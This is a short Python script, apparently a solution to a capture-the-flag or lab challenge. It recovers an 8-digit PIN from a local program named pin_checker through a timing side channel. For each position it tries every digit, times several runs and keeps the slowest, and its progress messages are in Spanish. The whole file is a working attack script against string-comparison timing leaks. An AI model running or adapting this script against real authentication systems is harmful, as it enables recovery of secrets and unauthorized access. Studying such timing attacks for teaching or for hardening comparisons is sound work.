#!/usr/bin/env python3
import statistics
import subprocess
import time

CMD = ["./pin_checker"]
DIGITS = "0123456789"
TRIALS = 3


def measure(pin: str):
    start = time.perf_counter()
    proc = subprocess.run(
        CMD,
        input=pin + "\n",
        capture_output=True,
        text=True,
        check=False,
    )
    duration = time.perf_counter() - start
    return duration, proc.stdout + proc.stderr


def best_digit(prefix: str) -> str:
    results = {}
    for digit in DIGITS:
        guess = prefix + digit + "0" * (8 - len(prefix) - 1)
        samples = []
        for _ in range(TRIALS):
            duration, _ = measure(guess)
            samples.append(duration)
        samples.sort()
        if len(samples) > 2:
            trimmed = samples[1:-1]
            metric = statistics.mean(trimmed) if trimmed else statistics.mean(samples)
        else:
            metric = statistics.mean(samples)
        results[digit] = metric
        print(f"Pos {len(prefix)} candidato {digit}: {metric:.6f}s")
    best = max(results, key=results.get)
    print(f"Mejor dígito para posición {len(prefix)}: {best}")
    return best


def main():
    pin = ""
    for _ in range(8):
        pin += best_digit(pin)
        print(f"Progreso PIN: {pin}")
    duration, output = measure(pin)
    print("PIN final:", pin)
    print("Salida final:\n", output)


if __name__ == "__main__":
    main()
